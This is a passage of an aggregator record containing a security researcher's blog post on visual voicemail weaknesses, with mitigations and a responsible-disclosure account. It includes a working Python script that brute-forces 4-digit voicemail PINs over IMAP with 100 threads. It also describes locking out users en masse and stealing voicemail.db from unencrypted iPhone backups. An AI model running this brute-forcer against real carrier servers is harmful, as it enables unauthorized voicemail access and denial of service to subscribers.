spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python functions\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"{0}:{1} worked!\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(username, password))</code></div><div class=\"line number19 index18 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">with </code><code class=\"python functions\">open</code><code class=\"python plain\">(</code><code class=\"python string\">'oput.txt'</code><code class=\"python plain\">, </code><code class=\"python string\">'a'</code><code class=\"python plain\">) as output:</code></div><div class=\"line number20 index19 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">output.write(</code><code class=\"python string\">\"{0}:{1} worked!\\n\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(username, password))</code></div><div class=\"line number21 index20 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">return</code> <code class=\"python plain\">password</code></div><div class=\"line number22 index21 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">except</code> <code class=\"python plain\">Exception as e:</code></div><div class=\"line number23 index22 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"Login error (trying {1}): {0}\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(e, password))</code></div><div class=\"line number24 index23 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">with </code><code class=\"python functions\">open</code><code class=\"python plain\">(</code><code class=\"python string\">'error_oput.txt'</code><code class=\"python plain\">, </code><code class=\"python string\">'a'</code><code class=\"python plain\">) as error_output:</code></div><div class=\"line number25 index24 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python plain\">error_output.write(</code><code class=\"python string\">\"{0}:{1} failed!\\n\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(username, password))</code></div><div class=\"line number26 index25 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">except</code> <code class=\"python plain\">Exception as e:</code></div><div class=\"line number27 index26 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"Connection error (trying {1}: {0}\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(e, password))</code></div><div class=\"line number28 index27 alt1\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python keyword\">print</code><code class=\"python plain\">(</code><code class=\"python string\">\"attempt took: {0}\"</code><code class=\"python plain\">.</code><code class=\"python functions\">format</code><code class=\"python plain\">(time.time() </code><code class=\"python keyword\">-</code> <code class=\"python plain\">start_time))</code></div><div class=\"line number29 index28 alt2\">&#160;</div><div class=\"line number30 index29 alt1\"><code class=\"python plain\">with futures.ThreadPoolExecutor(max_workers</code><code class=\"python keyword\">=</code><code class=\"python value\">100</code><code class=\"python plain\">) as executor:</code></div><div class=\"line number31 index30 alt2\"><code class=\"python spaces\">&#160;&#160;&#160;&#160;</code><code class=\"python plain\">pages </code><code class=\"python keyword\">=</code> <code class=\"python plain\">executor.</code><code class=\"python functions\">map</code><code class=\"python plain\">(brute, (password </code><code class=\"python keyword\">for</code> <code class=\"python plain\">password </code><code class=\"python keyword\">in</code> <code class=\"python plain\">combolist))</code></div></div></td></tr></tbody></table></div>\n\n<pre id=\"presourcecode_805899\" class=\"displaysourcecode\">  \nimport imaplib  \nimport itertools  \nimport string  \nimport time  \nimport futures\n\ncombolist = [\"\".join(list(x)) for x in itertools.product(string.digits, repeat=4)]  \noverall_start = time.time()\n\ndef brute(password):  \n    username = \"61410061410@vvm.example.com.au\"\n    start_time = time.time()\n    try:\n        mail = imaplib.IMAP4_SSL('vvm.example.com.au')\n        try:\n            mail.login('61410061410@vvm.example.com.au', password)\n            mail.list()\n            print(\"{0}:{1} worked!\".format(username, password))\n            with open('oput.txt', 'a') as output:\n                output.write(\"{0}:{1} worked!\\n\".format(username, password))\n            return password\n        except Exception as e:\n            print(\"Login error (trying {1}): {0}\".format(e, password))\n            with open('error_oput.txt', 'a') as error_output:\n                error_output.write(\"{0}:{1} failed!\\n\".format(username, password))\n    except Exception as e:\n        print(\"Connection error (trying {1}: {0}\".format(e, password))\n    print(\"attempt took: {0}\".format(time.time() - start_time))\n\nwith futures.ThreadPoolExecutor(max_workers=100) as executor:  \n    pages = executor.map(brute, (password for password in combolist))\n</pre>\n\n<p>It's the same one we can use for bruteforcing.</p>\n\n<p>Suppose you're testing VVM servers and you find that there is a lock out after <code>x</code> attempts, you could pretty much lockout a very large number of users. This may be chaotic. Customers would have to call the ISP to get their numbers voicemail reactivated and in some extreme examples, customers may even lose voicemail.</p>\n\n<p>This is a very basic exploit, however if you can't bruteforce the pin due to lock outs, this will most likely come in play.</p>\n\n<h4 id=\"malwarevectortoaccessvvm\">Malware vector to access VVM</h4>\n\n<p>We've already determined that the STATUS Class 0 SMS message containing the credentials for VVM authentication are located in a <code>.db</code> file for Apple phones. Since these credentials give access to the visual voicemail account of a user, if one were to steal this <code>voicemail.db</code> file, they could get access to the victims voicemail.</p>\n\n<p>This is interesting as it poses a new vector for malware creators - voicemail could be very important for targeted attacks. There are only a few requirements for an attacker to gain access to your voicemail via malware:</p>\n\n<ul>\n<li>You're on a mobile service provider with VVM enabled</li>\n<li>You have an iPhone backup (after activating VVM)</li>\n<li>The iPhone backup is unencrypted</li>\n<li>The attacker infects you and steals the voicemail.db via your backup stored locally on the computer</li>\n<li>The attacker gets 3g/4g access to your network and then can listen to your voicemails</li>\n</ul>\n\n<h4 id=\"largerscope\">Larger Scope</h4>\n\n<p>The two very specific attacks above are dangerous, however if we take a look at the larger scope - an attacker is not limited to just finding vulnerabilities on the IMAP server. </p>\n\n<p>In the larger view, the server which holds the voicemails could have a large range of other vulnerabilties. </p>\n\n<p>Perhaps it holds webapps that can be exploited to gain more access to the server or has other services which are vulnerable. Whether it be technical or through social engineering/other methods, getting access to a VVM server would lead to a large number of voicemails carrier wide, being leaked.</p>\n\n<p>Do you trust a carriers worth of voicemails on a single box which could be exploited now or in the future?</p>\n\n<hr>\n\n<p id=\"mitigation\"> </p>\n\n<h3 id=\"mitigationtechniques\">Mitigation Techniques</h3>\n\n<h4 id=\"mitigatingbruteforceaccountdosattacks\">Mitigating Bruteforce &#38; Account DoS Attacks</h4>\n\n<p>As I mention earlier, mitigating bruteforce through lockouts may not be the best option due to the possiblity of mass DoS'ing accounts. Instead I've thought of a few options which could be viable in mitigating bruteforce.</p>\n\n<ul>\n<li>Time based account lockouts (i.e. 30 mins after 10 attempts)</li>\n<li>IP/Subscriber based lockouts (not as effective)</li>\n</ul>\n\n<p>If my readers think of any other good mitigation techniques, we would love to discuss this in the comments below. We would personally prefer a time based lockout. Even more so, we would prefer our mobile service providers to use a completely random password instead of a pin for our visual voicemail service.</p>\n\n<hr>\n\n<p id=\"responsible\"> </p>\n\n<h3 id=\"responsibledisclosure\">Responsible Disclosure</h3>\n\n<h4 id=\"gsma\">GSMA</h4>\n\n<p>In my entire process of discovering vulnerabilties, I have been in close contact with the <a href=\"http://www.gsma.com\">GSMA</a>. The GSMA have pushed out my technical write up and PoC to all mobile network providers possible months ago. Whether or not the providers choose to test themselves and fix the vulnerability is up to them.</p>\n\n<p>You can find all of the responsible disclosure emails to GSMA here:</p>\n\n<p><a href=\"http://static.shubh.am/vvmdisclosure/Gmail - International Visual Voicemail Security.pdf\">http://static.shubh.am/vvmdisclosure/Gmail - International Visual Voicemail Security.pdf</a></p>\n\n<h4 id=\"vodafone\">Vodafone</h4>\n\n<p>The responsible disclosure process to Vodafone was not done directly by me, but rather via a third party who co-ordinated my research across and gave a time frame to Vodafone for a fix to be released. Vodafone fixed the flaw quickly, with a preliminary patch and performed a full patch in the coming weeks.</p>\n\n<hr>\n\n<p id=\"notes\"> </p>\n\n<h3 id=\"notes\">Notes</h3>\n\n<p>If there's one thing I want to get across from this lengthy post: <strong>test your voicemail.</strong></p>\n\n<p>Huey and I have done all of this research alone, with very little support and (most importantly) a massive lack of resources. We would really appreciate it if readers could give us feedback, test your provider's visual voicemail systems or just say hi.</p>\n\n<p>Thanks to all of my friends who've endured me going through my obsession with voicemail security in 2014, maybe I'll move onto something more challenging now. As a calculated total, both Huey's and my own efforts have allowed for us to <em>break</em> the authentication security of voicemail accounts for more than half of Australia's mobile users (60% or so). This is crazy!</p>\n\n<p>Say hi:</p>\n\n<p><a href=\"https://twitter.com/intent/tweet?screen_name=infosec_au\" class=\"twitter-mention-button\" data-size=\"large\" data-dnt=\"true\">Tweet to @infosec_au</a>  </p>\n\n<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>\n\n<p><a href=\"https://twitter.com/intent/tweet?screen_name=hueypeard\" class=\"twitter-mention-button\" data-size=\"large\" data-dnt=\"true\">Tweet to @hueypeard</a>  </p>\n\n<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>\n\n<script type=\"text/javascript\">SyntaxHighlighter.initialize();</script>","descriptionType":"html","publishedDate":"Sun, 19 Oct 2014 08:50:16 +0000","feedId":45361,"bgimg":"http://shubs.io/content/images/2014/Oct/iphone-visual-voicemail-1.jpg","linkMd5":"e99c055246e71cc31b564855fd20e518","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn23@2020_1/2020/10/14/03-43-27-376_b4ae3bb0b7649d09.webp","destWidth":620,"destHeight":333,"sourceBytes":66483,"destBytes":9446,"author":"Shubham Shah","articleImgCdnMap":{"http://shubs.io/content/images/2014/Oct/iphone-visual-voicemail-1.jpg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn23@2020_1/2020/10/14/03-43-27-376_b4ae3bb0b7649d09.webp","http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-20-08-pm.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn36@2020_2/2020/10/14/03-43-28-572_9c3b003003505a14.webp","http://shubs.io/content/images/2014/Oct/57.jpg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn32@2020_6/2020/10/14/03-43-28-610_e1aaa61e5287f30d.webp","http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-23-08-pm.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn44@2020_2/2020/10/14/03-43-28-448_fe55e12acf1f0aca.webp","http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-24-03-pm.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn40@2020_5/2020/10/14/03-43-28-407_49dc5cf61e70044f.webp","https://i.imgur.com/31jWiuy.gif":null},"publishedOrCreatedDate":1602647007213}],"record":{"createdTime":"2020-10-14 11:43:27","updatedTime":"2020-10-14 11:43:27","feedId":45361,"fetchDate":"Wed, 14 Oct 2020 03:43:27 +0000","fetchMs":304,"handleMs":18,"totalMs":121488,"newArticles":0,"totalArticles":15,"status":1,"type":0,"ip":"ad451f163558643b64c25fa9e19a17a0","hostName":"us-039*","requestId":"e9006dbb62e544ad96833a0939531f31_45361","contentType":"text/xml; charset=utf-8","totalBytes":133232,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":6,"articlesImgsGithubTotal":5,"successGithubMap":{"myreaderx8":1,"myreaderx27":1,"myreaderx10":1,"myreaderx21":1,"myreaderx18":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:37:57","updatedTime":"2020-09-07 05:56:01","id":45361,"name":"Shubham Shah","url":"http://shubs.io/rss/","subscriber":70,"website":null,"icon":"http://shubs.io/content/images/2016/11/cghQbZcm.jpg","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx61/cdn1@2020_4/2020/09/06/21-55-59-366_47a915f60b8123c2.jpg","description":"Security Researcher. Interested in application development, penetration testing and hacking the planet.","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-14 11:45:28","updatedTime":"2020-10-14 11:45:28","id":null,"feedId":45361,"linkMd5":"e99c055246e71cc31b564855fd20e518"}],"tmpCommonImgCdnBytes":9446,"tmpBodyImgCdnBytes":123786,"tmpBgImgCdnBytes":0,"extra4":{"start":1602647006882,"total":0,"statList":[{"spend":313,"msg":"获取xml内容"},{"spend":18,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":120249,"msg":"正文链接上传到cdn"}]},"extra5":6,"extra6":5,"extra7ImgCdnFailResultVector":[null,null],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-006.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-022.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://shubs.io/content/images/2014/Oct/iphone-visual-voicemail-1.jpg","sourceStatusCode":200,"destWidth":620,"destHeight":333,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn23@2020_1/2020/10/14/03-43-27-376_b4ae3bb0b7649d09.webp","sourceBytes":66483,"destBytes":9446,"targetWebpQuality":75,"feedId":45361,"totalSpendMs":891,"convertSpendMs":11,"createdTime":"2020-10-14 11:43:27","host":"us-018*","referer":"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/","linkMd5ListStr":"e99c055246e71cc31b564855fd20e518,e99c055246e71cc31b564855fd20e518","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"64.9 KB","destSize":"9.2 KB","compressRate":"14.2%"},{"code":1,"isDone":false,"source":"http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-24-03-pm.png","sourceStatusCode":200,"destWidth":814,"destHeight":192,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn40@2020_5/2020/10/14/03-43-28-407_49dc5cf61e70044f.webp","sourceBytes":57009,"destBytes":13672,"targetWebpQuality":75,"feedId":45361,"totalSpendMs":1122,"convertSpendMs":9,"createdTime":"2020-10-14 11:43:28","host":"us-034*","referer":"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/","linkMd5ListStr":"e99c055246e71cc31b564855fd20e518","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55.7 KB","destSize":"13.4 KB","compressRate":"24%"},{"code":1,"isDone":false,"source":"http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-23-08-pm.png","sourceStatusCode":200,"destWidth":961,"destHeight":370,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn44@2020_2/2020/10/14/03-43-28-448_fe55e12acf1f0aca.webp","sourceBytes":97737,"destBytes":46506,"targetWebpQuality":75,"feedId":45361,"totalSpendMs":1211,"convertSpendMs":20,"createdTime":"2020-10-14 11:43:28","host":"us-022*","referer":"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/","linkMd5ListStr":"e99c055246e71cc31b564855fd20e518","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"95.4 KB","destSize":"45.4 KB","compressRate":"47.6%"},{"code":1,"isDone":false,"source":"http://shubs.io/content/images/2014/Oct/Screen-Shot-2014-10-16-at-9-20-08-pm.png","sourceStatusCode":200,"destWidth":771,"destHeight":339,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn36@2020_2/2020/10/14/03-43-28-572_9c3b003003505a14.webp","sourceBytes":33987,"destBytes":26332,"targetWebpQuality":75,"feedId":45361,"totalSpendMs":1365,"convertSpendMs":13,"createdTime":"2020-10-14 11:43:28","host":"europe-57*","referer":"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/","linkMd5ListStr":"e99c055246e71cc31b564855fd20e518","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"33.2 KB","destSize":"25.7 KB","compressRate":"77.5%"},{"code":1,"isDone":false,"source":"http://shubs.io/content/images/2014/Oct/57.jpg","sourceStatusCode":200,"destWidth":600,"destHeight":524,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn32@2020_6/2020/10/14/03-43-28-610_e1aaa61e5287f30d.webp","sourceBytes":64310,"destBytes":37276,"targetWebpQuality":75,"feedId":45361,"totalSpendMs":1490,"convertSpendMs":16,"createdTime":"2020-10-14 11:43:28","host":"europe69*","referer":"http://shubs.io/breaking-international-voicemail-security-via-vvm-exploitation/","linkMd5ListStr":"e99c055246e71cc31b564855fd20e518","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"62.8 KB","destSize":"36.4 KB","compressRate":"58%"}],"successGithubMap":{"myreaderx8":1,"myreaderx27":1,"myreaderx10":1,"myreaderx21":1,"myreaderx18":1},"failGithubMap":{}}